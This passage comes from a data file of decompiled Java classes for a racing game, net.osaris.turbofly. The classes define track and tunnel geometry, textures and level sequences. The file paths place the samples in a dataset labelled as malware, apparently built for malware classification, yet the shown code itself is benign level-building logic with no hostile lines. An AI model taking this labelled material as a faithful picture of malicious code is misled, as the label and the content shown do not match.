Sequence.sequences[0].types[16]=Level1.l1piste1;     Sequence.sequences[0].types[17]=Level1.l1piste1A3;     Sequence.sequences[0].types[18]=Level1.l1piste1A;     Sequence.sequences[0].types[19]=Level1.l1piste1A2;     Sequence.sequences[1]=new Sequence(12,Level1.l1tunnelMiddle1,4,16);     Sequence.sequences[1].debutRepeat=1;     Sequence.sequences[1].types[0]=Level1.l1tunnelDebut;     Sequence.sequences[1].types[6]=Level1.l1tunnelMiddle2;     Sequence.sequences[2]=new Sequence(5,Level1.l1piste2,10,40);     Sequence.sequences[2].types[2]=Level1.l1piste2M;     Sequence.sequences[0].compatiblesSuites.add(Sequence.sequences[1]);     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[2]);     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[2]);     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[0]);     Sequence.sequences[2].compatiblesSuites.add(Sequence.sequences[0]);     Sequence.sequences[2].compatiblesSuites.add(Sequence.sequences[1]);   }   private static void loadCiel(  int level){     Level3.init();     int texture1=TextureUtil.loadTexture(""piste2.png"");     Sequence.sequences=new Sequence[2];     Sequence.sequences[0]=new Sequence(15,Level3.l3piste1,1,3);     Sequence.sequences[0].debutRepeat=1;     Sequence.sequences[0].types[0]=Level3.l3piste1A;     Sequence.sequences[0].compatiblesSuites.add(Sequence.sequences[0]);     Sequence.sequences[0].setTexture(texture1);     Sequence.sequences[1]=new Sequence(5,Level3.l3piste2,5,15);     Sequence.sequences[1].debutRepeat=0;     Sequence.sequences[1].types[0]=Level3.l3piste2O;     Sequence.sequences[1].types[1]=Level3.l3piste2O;     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[0]);     Sequence.sequences[1].setTexture(texture1);     Sequence.sequences[0].setTexture(texture1);     Sequence.sequences[1].setTexture(texture1);     Sequence.sequences[0].compatiblesSuites.add(Sequence.sequences[1]);     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[0]);   }   private static void loadDesert(  int level){     int texture1;     if (level == 4) {       texture1=TextureUtil.loadTexture(""piste4.png"");       Level5.black=Level5.blackDesert;       Level5.blue=Level5.blueDesert;     }  else {       texture1=TextureUtil.loadTexture(""piste7.png"");       Level5.black=Level5.blackSnow;       Level5.blue=Level5.blueSnow;     }     Level5.init();     Level5.l5piste1.setTexture(texture1);     Level5.l5piste1A.setTexture(texture1);     Level5.l5piste1A2.setTexture(texture1);     Level5.l5tunnelMiddle1.setTexture(texture1);     Level5.l5tunnelMiddle2.setTexture(texture1);     Level5.l5tunnelDebut.setTexture(texture1);     Level5.l5piste2.setTexture(texture1);     Level5.l5piste2M.setTexture(texture1);     Level5.l5piste3.setTexture(texture1);     Level5.l5piste3Debut.setTexture(texture1);     Level5.l5piste4.setTexture(texture1);     Level5.l5piste4Debut.setTexture(texture1);     Sequence.sequences=new Sequence[5];     Sequence.sequences[0]=new Sequence(6,Level5.l5piste1,10,40);     Sequence.sequences[0].types[1]=Level5.l5piste1A;     Sequence.sequences[0].types[4]=Level5.l5piste1A2;     Sequence.sequences[1]=new Sequence(12,Level5.l5tunnelMiddle1,4,16);     Sequence.sequences[1].debutRepeat=1;     Sequence.sequences[1].types[0]=Level5.l5tunnelDebut;     Sequence.sequences[2]=new Sequence(5,Level5.l5piste2,10,40);     Sequence.sequences[2].types[2]=Level5.l5piste2M;     Sequence.sequences[2].types[3]=Level5.l5piste2M;     Sequence.sequences[0].compatiblesSuites.add(Sequence.sequences[1]);     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[2]);     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[2]);     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[0]);     Sequence.sequences[2].compatiblesSuites.add(Sequence.sequences[0]);     Sequence.sequences[2].compatiblesSuites.add(Sequence.sequences[1]);     Sequence.sequences[3]=new Sequence(7,Level5.l5piste3,10,40);     Sequence.sequences[3].types[0]=Level5.l5piste3Debut;     Sequence.sequences[4]=new Sequence(7,Level5.l5piste4,10,40);     Sequence.sequences[4].types[0]=Level5.l5piste4Debut;   }   private static void loadVille(  int level){     int texture1;     Level4.init(level);     if (level == 3) {       texture1=TextureUtil.loadTexture(""piste3.png"");     }  else {       texture1=TextureUtil.loadTexture(""piste6.png"");     }     Sequence.sequences=new Sequence[3];     Sequence.sequences[0]=new Sequence(36,Level4.piste1,1,3);     Sequence.sequences[0].types[0]=Level4.piste1Face;     Sequence.sequences[0].types[1]=Level4.piste1B;     Sequence.sequences[0].types[2]=Level4.piste1;     Sequence.sequences[0].types[3]=Level4.piste1B;     Sequence.sequences[0].types[4]=Level4.piste1;     Sequence.sequences[0].types[5]=Level4.piste1B;     Sequence.sequences[0].types[6]=Level4.piste1;     Sequence.sequences[0].types[7]=Level4.piste1B;     Sequence.sequences[0].types[8]=Level4.piste1;     Sequence.sequences[0].types[9]=Level4.piste1BVide;     Sequence.sequences[0].types[10]=Level4.piste2Face;     Sequence.sequences[0].types[11]=Level4.piste2B;     Sequence.sequences[0].types[12]=Level4.piste2;     Sequence.sequences[0].types[13]=Level4.piste2B;     Sequence.sequences[0].types[14]=Level4.piste2;     Sequence.sequences[0].types[15]=Level4.piste2B;     Sequence.sequences[0].types[16]=Level4.piste2;     Sequence.sequences[0].types[17]=Level4.piste2BVide;     Sequence.sequences[0].types[18]=Level4.piste3Face;     Sequence.sequences[0].types[19]=Level4.piste3B;     Sequence.sequences[0].types[20]=Level4.piste3;     Sequence.sequences[0].types[21]=Level4.piste3B;     Sequence.sequences[0].types[22]=Level4.piste3;     Sequence.sequences[0].types[23]=Level4.piste3B;     Sequence.sequences[0].types[24]=Level4.piste3;     Sequence.sequences[0].types[25]=Level4.piste3B;     Sequence.sequences[0].types[26]=Level4.piste3;     Sequence.sequences[0].types[27]=Level4.piste3BVide;     Sequence.sequences[0].types[28]=Level4.piste4Face;     Sequence.sequences[0].types[29]=Level4.piste4B;     Sequence.sequences[0].types[30]=Level4.piste4;     Sequence.sequences[0].types[31]=Level4.piste4B;     Sequence.sequences[0].types[32]=Level4.piste4;     Sequence.sequences[0].types[33]=Level4.piste4B;     Sequence.sequences[0].types[34]=Level4.piste4;     Sequence.sequences[0].types[35]=Level4.piste4BVide;     Sequence.sequences[0].compatiblesSuites.add(Sequence.sequences[0]);     Sequence.sequences[0].minY=-10;     Sequence.sequences[0].maxY=0;     Sequence.sequences[0].setTexture(texture1);     Sequence.sequences[0].setSpecular(SectionType.black);     Sequence.sequences[0].setDiffuse(SectionType.graydiffuse);     Sequence.sequences[1]=new Sequence(5,Level4.tunnelDebut,1,3);     Sequence.sequences[1].types[1]=Level4.tunnelMiddle;     Sequence.sequences[1].types[2]=Level4.tunnelMiddleB;     Sequence.sequences[1].types[3]=Level4.tunnelMiddle;     Sequence.sequences[1].types[4]=Level4.tunnelMiddleB;     Sequence.sequences[1].debutRepeat=1;     Sequence.sequences[1].setTexture(texture1);     Sequence.sequences[1].compatiblesSuites.add(Sequence.sequences[1]);     Sequence.sequences[1].setTexture(texture1);     Sequence.sequences[1].setSpecular(SectionType.grayspecular);     Sequence.sequences[1].setDiffuse(SectionType.graydiffuse);     Sequence.sequences[2]=new Sequence(5,Level4.tunnelDebut,1,3);     Sequence.sequences[2].types[1]=Level4.tunnelMiddle2;     Sequence.sequences[2].types[2]=Level4.tunnelMiddle2B;     Sequence.sequences[2].types[3]=Level4.tunnelMiddle2;     Sequence.sequences[2].types[4]=Level4.tunnelMiddle2B;     Sequence.sequences[2].debutRepeat=1;     Sequence.sequences[2].setTexture(texture1);     Sequence.sequences[2].compatiblesSuites.add(Sequence.sequences[2]);     Sequence.sequences[2].setTexture(texture1);     Sequence.sequences[2].setSpecular(SectionType.grayspecular);     Sequence.sequences[2].setDiffuse(SectionType.graydiffuse);   }   private static void loadJumpyBall(  int level){     LevelJumpyBall.init();     int texture1=TextureUtil.loadTexture(""piste5.png"",false);     Sequence.sequences=new Sequence[1];     Sequence.sequences[0]=new Sequence(11,LevelJumpyBall.getType(""   00   "",texture1),1,1);     Sequence.sequences[0].types[1]=LevelJumpyBall.getType(""2  00   "",texture1);     Sequence.sequences[0].types[2]=LevelJumpyBall.getType(""1  00   "",texture1);     Sequence.sequences[0].types[3]=LevelJumpyBall.getType(""  00    "",texture1);     Sequence.sequences[0].types[4]=LevelJumpyBall.getType(""  0     "",texture1);     Sequence.sequences[0].types[5]=LevelJumpyBall.getType(""  0     "",texture1);     Sequence.sequences[0].types[6]=LevelJumpyBall.getType("" 00     "",texture1);     Sequence.sequences[0].types[7]=LevelJumpyBall.getType("" 0    22"",texture1);     Sequence.sequences[0].types[8]=LevelJumpyBall.getType("" 0    34"",texture1);     Sequence.sequences[0].types[9]=LevelJumpyBall.getType("" 00   0 "",texture1);     Sequence.sequences[0].types[10]=LevelJumpyBall.getType(""  00    "",texture1);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.levels\Level1.code","public class Level1 extends SectionTypesBuilder {   public static SectionType l1piste1=null;   public static SectionType l1piste1A=null;   public static SectionType l1piste1A2=null;   public static SectionType l1piste1A3=null;   public static SectionType l1piste2=null;   public static SectionType l1piste2M=null;   public static SectionType l1tunnelMiddle1=null;   public static SectionType l1tunnelMiddle2=null;   public static SectionType l1tunnelDebut=null;   public static float[] blue={0.99215686f,0.60784316f,0.34509805f,1.0f};   public static void init(){     l1piste1=getL1Piste1();     l1piste1A=getL1Piste1A();     l1piste1A2=getL1Piste1A2();     l1piste1A3=getL1Piste1A3();     l1piste2=getL1Piste2();     l1piste2M=getL1Piste2M();     l1tunnelMiddle1=getTunelMiddle1();     l1tunnelMiddle2=getTunelMiddle2();     l1tunnelDebut=getDebutTunnel();   }   private static SectionType getTunelMiddle1(){     double[] coordsX={0.0d,2.5d,3.0d,3.0d,3.5d,3.9d,3.9d,3.3d,2.5d,2.5d,1.5d,0.0d,-1.5d,-2.5d,-2.5d,-3.3d,-3.9d,-3.9d,-3.5d,-3.0d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.0d,-0.9d,-0.9d,-0.9d,-1.9d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-1.9d,-0.9d,-0.9d,-0.9d,-0.0d,0.0d,0.0d,0.0d};     int[] texX={16,15,14,2,3,4,6,7,6,7,6,7,6,7,6,7,6,4,3,2,14,15,16};     int[] finSeg=new int[23];     finSeg[2]=1;     finSeg[5]=1;     finSeg[8]=1;     finSeg[13]=1;     finSeg[16]=1;     finSeg[19]=1;     finSeg[22]=1;     float[] texY=new float[texX.length];     for (int i=0; i < texY.length; i++) {       texY[i]=1.0f;     }     float[] fogColor={0.0f,0.0f,0.0f,0.0f};     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.diffuse=SectionType.black;     result.specular=SectionType.black;     return result;   }   private static SectionType getTunelMiddle2(){     double[] coordsX={0.0d,2.5d,3.0d,3.0d,3.5d,3.9d,3.9d,3.3d,2.5d,2.5d,1.5d,0.0d,-1.5d,-2.5d,-2.5d,-3.3d,-3.9d,-3.9d,-3.5d,-3.0d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.0d,-0.9d,-0.9d,-0.9d,-1.9d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-1.9d,-0.9d,-0.9d,-0.9d,-0.0d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,2,3,4,7,8,7,8,7,8,7,8,7,8,7,4,3,2,2,1};     int[] finSeg=new int[23];     finSeg[2]=1;     finSeg[5]=1;     finSeg[8]=1;     finSeg[13]=1;     finSeg[16]=1;     finSeg[19]=1;     finSeg[22]=1;     float[] texY=new float[texX.length];     for (int i=0; i < texY.length; i++) {       texY[i]=1.0f;     }     float[] fogColor={0.0f,0.0f,0.0f,0.0f};     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.diffuse=SectionType.black;     result.specular=SectionType.black;     result.ambient=SectionType.whiteambient;     return result;   }   private static SectionType getDebutTunnel(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,3.3d,2.5d,2.5d,1.5d,0.0d,-1.5d,-2.5d,-2.5d,-3.3d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,-7.5d,-9.0d,7.5d,9.0d,-5.0d,-7.5d,-4.56d,-2.5d,4.56d,2.5d,5.0d,7.5d,-9.0d,-9.0d,9.0d,9.0d};     double[] coordsY={0.0d,0.0d,-0.0d,-0.9d,-0.9d,-0.9d,-1.9d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-2.8d,-1.9d,-0.9d,-0.9d,-0.9d,-0.0d,0.0d,0.0d,-2.8d,-4.5d,-2.8d,-4.5d,0.0d,-2.8d,-0.0d,-2.8d,-0.0d,-2.8d,0.0d,-2.8d,-4.5d,-6.0d,-4.5d,-6.0d};     int[] texX={0,1,2,3,4,6,7,8,6,7,6,7,6,8,7,6,4,3,2,1,0,4,4,5,5,4,4,5,5,4,4,5,5,10,10,12,12};     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     int[] finSeg=new int[29];     finSeg[4]=1;     finSeg[7]=1;     finSeg[12]=1;     finSeg[15]=1;     finSeg[20]=1;     finSeg[21]=2;     finSeg[22]=3;     finSeg[23]=2;     finSeg[24]=3;     finSeg[25]=2;     finSeg[26]=3;     finSeg[27]=2;     finSeg[28]=3;     float[] fogColor={0.0f,0.0f,0.0f,0.0f};     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.diffuse=SectionType.black;     result.specular=SectionType.black;     return result;   }   private static SectionType getL1Piste1(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,9.0d,8.5d,8.5d,-8.5d,-8.5d,-9.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,5.5d,5.5d,7.5d,7.5d,-8.0d,-8.0d,-6.0d,-6.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.9d,-0.9d,-0.5d,0.0d,-4.5d,-4.5d,-5.5d,-5.5d,-4.5d,-4.5d,0.0d,-0.5d,-0.9d,-0.9d,0.0d,0.0d,0.0d,-1.0d,-5.5d,-1.0d,-5.5d,-2.0d,-6.5d,-2.0d,-6.5d};     int[] texX={0,1,2,3,4,5,6,5,4,3,3,4,5,6,5,4,3,2,1,0,9,9,10,10,8,8,9,9};     int[] finSeg=new int[24];     finSeg[9]=1;     finSeg[19]=1;     finSeg[20]=2;     finSeg[21]=3;     finSeg[22]=2;     finSeg[23]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getL1Piste1A(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,9.0d,8.5d,8.5d,-8.5d,-8.5d,-9.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,6.0d,6.0d,8.0d,8.0d,-6.5d,-6.5d,-4.5d,-4.5d};     double[] coordsY={0.0d,0.0d,0.0d,-0.9d,-0.9d,-0.5d,0.0d,-4.5d,-4.5d,-5.5d,-5.5d,-4.5d,-4.5d,0.0d,-0.5d,-0.9d,-0.9d,0.0d,0.0d,0.0d,-1.5d,-6.0d,-1.5d,-6.0d,-0.5d,-5.0d,-0.5d,-5.0d};     int[] texX={0,1,2,3,4,5,6,5,4,3,3,4,5,6,5,4,3,2,1,0,8,8,9,9,8,8,9,9};     int[] finSeg=new int[24];     finSeg[9]=1;     finSeg[19]=1;     finSeg[20]=2;     finSeg[21]=3;     finSeg[22]=2;     finSeg[23]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getL1Piste1A2(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,9.0d,8.5d,8.5d,-8.5d,-8.5d,-9.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,5.0d,5.0d,7.0d,7.0d,-7.0d,-7.0d,-5.0d,-5.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.9d,-0.9d,-0.5d,0.0d,-4.5d,-4.5d,-5.5d,-5.5d,-4.5d,-4.5d,0.0d,-0.5d,-0.9d,-0.9d,0.0d,0.0d,0.0d,-1.0d,-5.5d,-1.0d,-5.5d,-1.0d,-4.5d,-1.0d,-4.5d};     int[] texX={0,1,2,3,4,5,6,5,4,3,3,4,5,6,5,4,3,2,1,0,8,8,9,9,9,9,10,10};     int[] finSeg=new int[24];     finSeg[9]=1;     finSeg[19]=1;     finSeg[20]=2;     finSeg[21]=3;     finSeg[22]=2;     finSeg[23]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getL1Piste1A3(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,9.0d,8.5d,8.5d,-8.5d,-8.5d,-9.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,4.0d,4.0d,6.0d,6.0d,-9.0d,-9.0d,-7.0d,-7.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.9d,-0.9d,-0.5d,0.0d,-4.5d,-4.5d,-5.5d,-5.5d,-4.5d,-4.5d,0.0d,-0.5d,-0.9d,-0.9d,0.0d,0.0d,0.0d,-0.5d,-3.5d,-0.5d,-3.5d,-2.0d,-7.0d,-2.0d,-7.0d};     int[] texX={0,1,2,3,4,5,6,5,4,3,3,4,5,6,5,4,3,2,1,0,9,9,10,10,9,9,10,10};     int[] finSeg=new int[24];     finSeg[9]=1;     finSeg[19]=1;     finSeg[20]=2;     finSeg[21]=3;     finSeg[22]=2;     finSeg[23]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getL1Piste2(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,3.9d,4.4d,-8.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.9d,-0.9d,-0.9d,-3.0d,-4.0d,-4.5d,0.0d,-0.5d,-0.9d,-0.9d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,3,4,12,13,12,5,6,5,4,3,2,1};     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     int[] finSeg=new int[16];     finSeg[4]=1;     finSeg[7]=1;     finSeg[15]=1;     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getL1Piste2M(){     double[] coordsX={0.0d,2.5d,3.0d,3.0d,3.5d,3.9d,3.9d,3.9d,0.0d,-2.9d,-3.9d,-8.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-3.0d,-2.5d,0.0d,-3.9d,-3.4d,4.4d,4.4d,-4.9d,-3.9d,-3.9d,-2.9d};     double[] coordsY={0.0d,0.0d,0.0d,0.0d,-0.9d,-0.9d,-0.9d,-3.0d,-3.0d,-3.0d,0.0d,-4.5d,0.0d,-0.5d,-0.9d,-0.9d,0.0d,0.0d,0.0d,0.0d,-2.99d,-4.0d,-2.99d,-4.0d,0.0d,-2.99d,0.0d,-2.99d};     int[] texX={16,15,14,2,3,4,12,13,14,13,14,5,6,5,4,3,2,14,15,16,13,13,14,14,13,13,14,14};     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,0.0f,1.0f,0.0f,1.0f};     int[] finSeg=new int[24];     finSeg[2]=1;     finSeg[5]=1;     finSeg[10]=1;     finSeg[16]=1;     finSeg[19]=1;     finSeg[20]=2;     finSeg[21]=3;     finSeg[22]=2;     finSeg[23]=3;     float[] fogColor=blue;     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.diffuse=SectionType.graydiffuse;     result.specular=SectionType.black;     return result;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.levels\Level3.code","public class Level3 extends SectionTypesBuilder {   public static SectionType l3piste1=null;   public static SectionType l3piste2=null;   public static SectionType l3piste2O=null;   public static SectionType l3piste1A=null;   public static float[] blue=Tableaux.blue3;   public static void init(){     l3piste1=getL3Piste1();     l3piste2=getL3Piste2();     l3piste2O=getL3Piste2O();     l3piste1A=getL3Piste1A();   }   private static SectionType getL3Piste1(){     double[] coordsX={0.0d,2.0d,3.0d,3.1d,3.1d,3.0d,2.5d,0.0d,0.0d,-2.5d,-3.0d,-3.1d,-3.1d,-3.0d,-2.0d,0.0d};     double[] coordsY={0.0d,0.0d,-0.1d,0.4d,1.0d,1.2d,2.0d,2.0d,2.0d,2.0d,1.2d,1.0d,0.4d,-0.1d,0.0d,0.0d};     int[] texX={0,1,2,3,4,5,4,5,5,4,5,4,3,2,1};     int[] finSeg=new int[16];     finSeg[7]=1;     finSeg[15]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getL3Piste2(){     double[] coordsX={0.0d,2.0d,3.0d,3.1d,3.1d,2.5d,-2.5d,-3.0d,-3.1d,-3.1d,-3.0d,-2.0d,0.0d,0.0d,-3.5d,-5.5d,-3.5d,3.5d,5.5d,3.5d,0.0d,3.7d,5.7d,3.7d,-3.7d,-5.7d,-3.7d,5.5d,3.5d,5.7d,3.7d,-5.7d,-3.7d,-5.5d,-3.5d,-3.7d,-3.7d,3.7d,3.7d,-5.5d,-3.5d,-5.7d,-3.7d,5.7d,3.7d,5.5d,3.5d};     double[] coordsY={0.0d,0.0d,-0.1d,0.4d,1.0d,2.0d,2.0d,1.2d,1.0d,0.4d,-0.1d,0.0d,0.0d,-3.0d,-3.0d,0.0d,3.0d,3.0d,0.0d,-3.0d,-3.0d,-3.2d,0.0d,3.2d,3.2d,0.0d,-3.2d,0.0d,-3.0d,-0.0d,-3.2d,-0.0d,-3.2d,0.0d,-3.0d,-3.0d,-3.2d,-3.0d,-3.2d,0.0d,3.0d,0.0d,3.2d,0.0d,3.2d,0.0d,3.0d};     int[] texX={0,1,2,3,4,5,4,5,4,3,2,1,0,3,4,5,4,3,4,5,4,5,4,3,4,5,4,4,4,5,5,4,4,5,5,4,4,5,5,4,4,5,5,4,4,5,5};     int[] finSeg=new int[37];     finSeg[12]=1;     finSeg[20]=1;     finSeg[26]=1;     finSeg[27]=2;     finSeg[28]=3;     finSeg[29]=2;     finSeg[30]=3;     finSeg[31]=2;     finSeg[32]=3;     finSeg[33]=2;     finSeg[34]=3;     finSeg[35]=2;     finSeg[36]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f};     float[] fogColor=blue;     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     return result;   }   private static SectionType getL3Piste2O(){     double[] coordsX={0.0d,2.0d,3.0d,3.0d,3.1d,3.1d,3.0d,2.5d,0.0d,0.0d,-2.5d,-3.0d,-3.1d,-3.1d,-3.0d,-3.0d,-2.0d,0.0d};     double[] coordsY={0.0d,0.0d,-0.1d,-0.1d,0.4d,1.0d,1.2d,2.0d,2.0d,2.0d,2.0d,1.2d,1.0d,0.4d,-0.1d,-0.1d,0.0d,0.0d};     int[] texX={16,15,14,2,3,4,5,4,5,5,4,5,4,3,2,14,15,16};     int[] finSeg=new int[18];     finSeg[2]=1;     finSeg[8]=1;     finSeg[14]=1;     finSeg[17]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.diffuse=SectionType.graydiffuse;     result.specular=SectionType.black;     return result;   }   private static SectionType getL3Piste3(){     double[] coordsX={0.0d,2.0d,3.0d,3.1d,3.1d,3.0d,2.5d,0.0d,0.0d,-2.5d,-3.0d,-3.1d,-3.1d,-3.0d,-2.0d,0.0d,5.5d,3.5d,3.7d,5.7d,5.5d,5.5d,3.5d,5.7d,3.7d,-5.5d,-5.7d,-4.7d,-4.5d,-5.5d,-5.7d,-4.7d,-5.5d,-4.5d};     double[] coordsY={0.0d,0.0d,-0.1d,0.4d,1.0d,1.2d,2.0d,2.0d,2.0d,2.0d,1.2d,1.0d,0.4d,-0.1d,0.0d,0.0d,-1.5d,-4.5d,-4.7d,-1.7d,-1.5d,-1.5d,-4.5d,-1.7d,-4.7d,-1.5d,-1.7d,-3.7d,-3.5d,-1.5d,-1.7d,-3.7d,-1.5d,-3.5d};     int[] texX={0,1,2,3,4,5,4,5,5,4,5,4,3,2,1,0,6,7,6,7,6,4,4,5,5,6,7,6,7,6,4,4,5,5};     int[] finSeg=new int[30];     finSeg[7]=1;     finSeg[15]=1;     finSeg[20]=1;     finSeg[21]=2;     finSeg[22]=3;     finSeg[27]=1;     finSeg[28]=2;     finSeg[29]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getL3Piste1A(){     double[] coordsX={0.0d,2.0d,3.0d,3.1d,3.1d,3.0d,2.5d,0.0d,0.0d,-2.5d,-3.0d,-3.1d,-3.1d,-3.0d,-2.0d,0.0d,-2.5d,-3.1d,2.5d,3.1d,-3.1d,-3.05d,3.1d,3.05d};     double[] coordsY={0.0d,0.0d,-0.1d,0.4d,1.0d,1.2d,2.0d,2.0d,2.0d,2.0d,1.2d,1.0d,0.4d,-0.1d,0.0d,0.0d,2.0d,1.2d,2.0d,1.2d,1.2d,-0.1d,1.2d,-0.1d};     int[] texX={0,1,2,3,4,5,4,5,5,4,5,4,3,2,1,0,4,4,5,5,3,3,4,4};     int[] finSeg=new int[20];     finSeg[7]=1;     finSeg[15]=1;     finSeg[16]=2;     finSeg[17]=3;     finSeg[18]=2;     finSeg[19]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   } } "
